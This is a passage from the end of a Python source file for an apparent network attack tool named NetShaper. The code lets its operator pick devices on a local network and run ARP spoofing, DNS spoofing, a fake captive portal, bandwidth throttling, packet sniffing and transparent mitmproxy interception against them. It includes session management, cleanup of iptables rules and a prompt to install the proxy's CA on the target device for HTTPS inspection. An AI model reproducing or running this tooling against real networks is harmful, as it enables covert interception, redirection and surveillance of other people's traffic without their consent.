        self.disc.resolve_hostnames(devices)
        return devices

    def add_target(self, target: Device, arp_on=True, dns_spoof=False,
                   captive_portal=False,
                   http_redirect_port: Optional[int] = None,
                   limit=None):
        with self._lifecycle_lock:
            mark_base = self.mark_pool.acquire(target.ip)
            session   = TargetSession(
                target, self.interface, self.own_mac,
                self.own_ip, self.own_ipv6,
                self.gw, self.gw_mac, self.gw_ipv6,
                self.shaper)
            session.setup(dns_spoof=dns_spoof, captive_portal=captive_portal,
                          http_redirect_port=http_redirect_port,
                          limit=limit, mark_base=mark_base)
            session.start_spoof(arp_on=arp_on)
            self.sessions[target.ip] = session
        log.info(f"Target {target.ip} added "
                 f"(ARP={arp_on} DNS={dns_spoof} "
                 f"Portal={captive_portal} HTTP→{http_redirect_port})")

    def remove_target(self, ip: str):
        with self._lifecycle_lock:
            session = self.sessions.get(ip)
            if not session:
                return
            # Signal spoof loops to exit (lockless read in their while condition)
            session.active        = False
            session.is_shutting_down = True
            del self.sessions[ip]

        # Cleanup happens outside the lock — spoof threads will exit naturally
        session.cleanup()
        self.mark_pool.release(ip)
        log.info(f"Target {ip} removed")

    def cleanup(self):
        print_flush("\n--- NetShaper Shutdown ---")
        with self._lifecycle_lock:
            self.is_shutting_down = True
            for s in self.sessions.values():
                s.active         = False
                s.is_shutting_down = True

        for ip in list(self.sessions.keys()):
            self.remove_target(ip)

        if self.sniffer:
            if hasattr(self.sniffer, 'stop'):
                self.sniffer.stop()
        if self._mitm_proc:
            self._mitm_proc.terminate()
            log.info("mitmproxy terminated")
        self._remove_global_rules()
        self.shaper.cleanup()
        if os.path.exists(STATE_FILE):
            os.remove(STATE_FILE)
        log.info("Network restored.")

    def launch_sniffer(self, target_ips=None, save_pcap=False, rolling=False):
        if self.sniffer:
            self.sniffer.stop()
        if rolling:
            self.sniffer = RollingPacketSniffer(
                self.interface, target_ips=target_ips)
        else:
            self.sniffer = PacketSniffer(
                self.interface, target_ips=target_ips, save_pcap=save_pcap)
        self.sniffer.start()

    def launch_mitmproxy(self, port: int = 8088, web_port: int = 8083) -> bool:
        """Launch mitmweb and poll for readiness instead of sleeping."""
        if check_local_port(self.own_ip, port):
            log.info(f"mitmproxy already running on :{port}")
            return True
        try:
            self._mitm_proc = subprocess.Popen(
                ["mitmweb", "--mode", "transparent",
                 "--listen-port", str(port),
                 "--set", f"web_port={web_port}"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            for attempt in range(10):
                if check_local_port(self.own_ip, port):
                    print_flush(f"  [+] mitmproxy ready → http://127.0.0.1:{web_port}")
                    return True
                log.debug(f"Waiting for mitmproxy… (attempt {attempt+1}/10)")
                time.sleep(0.5)
            log.error(f"mitmproxy did not bind to :{port} within 5 s")
            return False
        except FileNotFoundError:
            print_flush("  [!] mitmweb not found.  pip install mitmproxy")
            return False

    def save_state(self):
        data = {
            "interface": self.interface,
            "targets":   [{"ip": s.target.ip, "dns": s.dns_on, "limit": s.limit}
                          for s in self.sessions.values()],
            "gw":        self.gw,
            "own_ip":    self.own_ip,
        }
        dir_name = os.path.dirname(STATE_FILE)
        try:
            with tempfile.NamedTemporaryFile('w', dir=dir_name, delete=False) as tf:
                json.dump(data, tf)
                tmp = tf.name
            os.replace(tmp, STATE_FILE)   # Atomic write
        except Exception as e:
            log.error(f"State save failed: {e}")

    def load_state_and_cleanup(self):
        if not os.path.exists(STATE_FILE):
            return
        try:
            with open(STATE_FILE) as f:
                data = json.load(f)
            iface = data.get("interface")
            if iface:
                print_flush(f"  [!] Stale session on {iface} — cleaning up…")
                for binary in ["iptables", "ip6tables"]:
                    if not shutil.which(binary):
                        continue
                    for table in ["nat", "mangle"]:
                        result = subprocess.run(
                            [binary, "-t", table, "-L", "--line-numbers"],
                            capture_output=True, text=True)
                        for line in result.stdout.splitlines():
                            for token in line.split():
                                if token.startswith("NS-"):
                                    SubprocessRunner.run(
                                        [binary, "-t", table, "-F", token],
                                        check=False, silent=True)
                                    SubprocessRunner.run(
                                        [binary, "-t", table, "-X", token],
                                        check=False, silent=True)
                SubprocessRunner.run(["tc", "qdisc", "del", "dev", iface, "root"],
                                     check=False, silent=True)
                SubprocessRunner.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                                     silent=True)
                log.info("Stale rules cleaned.")
            os.remove(STATE_FILE)
        except Exception:
            log.debug("No valid state file to recover.")

    def monitor(self):
        old = psutil.net_io_counters(pernic=True).get(self.interface)
        while not self.stop.wait(2):
            new = psutil.net_io_counters(pernic=True).get(self.interface)
            if old and new:
                tx = new.bytes_sent - old.bytes_sent
                rx = new.bytes_recv - old.bytes_recv
                print_flush(
                    f"\r  TX:{self.scale_bytes(tx)}  RX:{self.scale_bytes(rx)}   ",
                    end='')
            old = new
        print_flush()


# ── UI helpers ────────────────────────────────────────────────────────────────
def pick_targets_ui(devices: List[Device]) -> List[Device]:
    if not devices:
        sys.exit("[NetShaper] No devices found.")
    print_flush("\n" + "=" * 90)
    print_flush("  Devices:")
    print_flush("=" * 90)
    print_flush(f"  {'No':<4} {'IP':<16} {'Hostname':<28} {'MAC'}")
    for i, d in enumerate(devices, 1):
        print_flush(f"  {i:<4} {d.ip:<16} {(d.hostname or ''):<28} {d.mac}")
    print_flush("=" * 90)
    while True:
        choice = safe_input("\n  Select devices (e.g. 1,2,5  1-3  all): ").lower()
        if not choice:
            continue
        if choice == 'all':
            return devices
        selected: List[Device] = []
        try:
            for part in choice.split(','):
                part = part.strip()
                if '-' in part:
                    a, b = part.split('-', 1)
                    s, e = int(a), int(b)
                    if 1 <= s <= e <= len(devices):
                        selected.extend(devices[s-1:e])
                    else:
                        print_flush(f"  [!] Range {a}-{b} out of bounds.")
                        break
                else:
                    idx = int(part) - 1
                    if 0 <= idx < len(devices):
                        selected.append(devices[idx])
                    else:
                        print_flush(f"  [!] Index {part} out of range.")
                        break
            else:
                if selected:
                    return selected
                print_flush("  [!] No valid devices selected.")
        except ValueError:
            print_flush("  [!] Invalid format. Use numbers, ranges, or 'all'.")


def pick_limit_ui() -> float:
    presets = {"1": 1.0, "2": 2.0, "3": 3.0, "4": 5.0}
    print_flush("\n  Bandwidth presets:")
    print_flush("  [1] 1 Mbps  [2] 2 Mbps  [3] 3 Mbps  [4] 5 Mbps  [5] Custom")
    while True:
        c = safe_input("  Select (1-5): ")
        if c in presets:
            return presets[c]
        if c == "5":
            try:
                v = float(safe_input("  Enter Mbps: "))
                if 0.1 <= v <= 1000:
                    return v
                print_flush("  [!] 0.1 – 1000 Mbps only.")
            except ValueError:
                print_flush("  [!] Invalid number.")


# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="NetShaper v3.8.0")
    parser.add_argument("--dry-run", action="store_true",
                        help="Print commands without executing")
    args = parser.parse_args()
    global DRY_RUN
    DRY_RUN = args.dry_run
    if DRY_RUN:
        print_flush("[*] DRY RUN MODE — no system changes.\n")

    print_flush(BANNER)
    SystemChecker.check()

    ifaces = [(n, a.address)
              for n, addrs in psutil.net_if_addrs().items()
              for a in addrs
              if a.family == socket.AF_INET
              and not a.address.startswith("127.")]
    if not ifaces:
        sys.exit("[NetShaper] No active interface.")
    if len(ifaces) == 1:
        interface = ifaces[0][0]
        print_flush(f"  Interface: {interface} ({ifaces[0][1]})")
    else:
        print_flush("\n  Interfaces:")
        for i, (n, ip) in enumerate(ifaces, 1):
            print_flush(f"  [{i}] {n} ({ip})")
        while True:
            choice = safe_input(f"\n  Select (1-{len(ifaces)}): ")
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(ifaces):
                    interface = ifaces[idx][0]
                    break
                print_flush("  [!] Out of range.")
            except ValueError:
                print_flush("  [!] Invalid number.")

    if not DRY_RUN:
        NetShaper(interface).load_state_and_cleanup()

    ns = NetShaper(interface)
    if not ns.own_ip:
        sys.exit("[NetShaper] Could not determine own IP.")
    if not ns.gw:
        ns.gw = safe_input("  Gateway IP: ")
    print_flush(f"  Your IP : {ns.own_ip}\n  Gateway : {ns.gw}")
    if ns.gw_ipv6:
        print_flush(f"  IPv6 GW : {ns.gw_ipv6}")

    devices = ns.discover()
    targets = pick_targets_ui(devices)

    print_flush("\n  ── Features (enter numbers e.g. 1 3 5) ──────────────────")
    print_flush("  [1] ARP spoofing (core MITM)")
    print_flush("  [2] DNS spoofing")
    print_flush("  [3] Captive portal (index.html for HTTP)")
    print_flush("  [4] Bandwidth throttle")
    print_flush("  [5] Packet sniffer")
    print_flush("  [6] mitmproxy HTTPS inspection")

    choices  = safe_input("  Choices: ").split()
    features = {int(c) for c in choices if c.isdigit() and 1 <= int(c) <= 6}

    arp_on         = 1 in features
    dns_spoof_on   = 2 in features
    captive_portal = 3 in features
    throttle_on    = 4 in features
    sniff_on       = 5 in features
    mitm_on        = 6 in features

    if dns_spoof_on and not captive_portal:
        print_flush("  [!] DNS spoofing without captive portal will break HTTP for the target.")
        if safe_input("  Enable captive portal too? (y/n): ").lower() == 'y':
            captive_portal = True

    if captive_portal and mitm_on:
        http_redirect_port: Optional[int] = 8088
    elif captive_portal:
        http_redirect_port = 80
    elif mitm_on:
        http_redirect_port = 8088
    else:
        http_redirect_port = None

    if http_redirect_port:
        print_flush("  [!] HTTP redirect captures plain HTTP only.")
        print_flush("      For HTTPS install the mitmproxy CA on the target device.")

    limit     = pick_limit_ui() if throttle_on else None
    save_pcap = False
    rolling   = False
    if sniff_on:
        save_pcap = safe_input("  Save to .pcap? (y/n): ").lower() == 'y'
        if save_pcap:
            rolling = safe_input("  Use rolling 50 MB files? (y/n): ").lower() == 'y'

    # ── Pre-flight checks ──────────────────────────────────────────────────
    if dns_spoof_on and not check_local_port(ns.own_ip, 53, socket.SOCK_DGRAM):
        print_flush("  [!] Fake DNS (port 53) not reachable.")
        print_flush("      sudo python3 fake_server_final.py")
        if safe_input("  Continue anyway? (y/n): ").lower() != 'y':
            sys.exit(0)

    if http_redirect_port == 80 and not check_local_port(ns.own_ip, 80):
        print_flush("  [!] Fake HTTP (port 80) not reachable.")
        print_flush("      sudo python3 fake_server_final.py")
        if safe_input("  Continue anyway? (y/n): ").lower() != 'y':
            sys.exit(0)

    if http_redirect_port == 8088 and not check_local_port(ns.own_ip, 8088):
        print_flush("  [!] mitmproxy (port 8088) not reachable.")
        if safe_input("  Auto-launch mitmproxy? (y/n): ").lower() == 'y':
            if not ns.launch_mitmproxy(port=8088, web_port=8083):
                if safe_input("  Continue without mitmproxy? (y/n): ").lower() != 'y':
                    sys.exit(0)
        else:
            print_flush("      mitmweb --mode transparent --listen-port 8088 "
                        "--set web_port=8083")
            if safe_input("  Continue anyway? (y/n): ").lower() != 'y':
                sys.exit(0)

    # ── Summary ────────────────────────────────────────────────────────────
    print_flush(f"\n{'='*58}")
    print_flush(f"  Targets       : {', '.join(t.ip for t in targets)}")
    print_flush(f"  ARP spoof     : {'Yes' if arp_on else 'No'}")
    print_flush(f"  DNS spoof     : {'Yes' if dns_spoof_on else 'No'}")
    print_flush(f"  Captive portal: {'Yes' if captive_portal else 'No'}")
    if captive_portal:
        print_flush(f"    HTTP → port : {http_redirect_port}")
    print_flush(f"  Throttle      : {f'{limit} Mbps' if throttle_on else 'No'}")
    print_flush(f"  mitmproxy     : {'Yes' if mitm_on else 'No'}")
    print_flush(f"  Sniffer       : {'Yes' if sniff_on else 'No'}")
    if sniff_on and save_pcap:
        print_flush(f"    Rolling pcap: {'Yes' if rolling else 'No'}")
    print_flush(f"{'='*58}")

    if safe_input("\n  Proceed? (y/n): ").lower() != 'y':
        sys.exit(0)

    def sig_handler(sig, frame):
        log.warning("Signal received — shutting down…")
        ns.cleanup()
        sys.exit(0)

    signal.signal(signal.SIGINT,  sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)

    ns._apply_global_rules()

    for target in targets:
        ns.add_target(target,
                      arp_on=arp_on,
                      dns_spoof=dns_spoof_on,
                      captive_portal=captive_portal,
                      http_redirect_port=http_redirect_port,
                      limit=limit if throttle_on else None)

    if sniff_on:
        ns.launch_sniffer(target_ips=[t.ip for t in targets],
                          save_pcap=save_pcap, rolling=rolling)

    ns.save_state()
    threading.Thread(target=ns.monitor, daemon=True).start()
    log.info("Active. Ctrl+C to stop.")
    try:
        while not ns.stop.wait(1):
            pass
    except KeyboardInterrupt:
        pass
    ns.cleanup()
    log.info("Goodbye!")


if __name__ == "__main__":
    main()
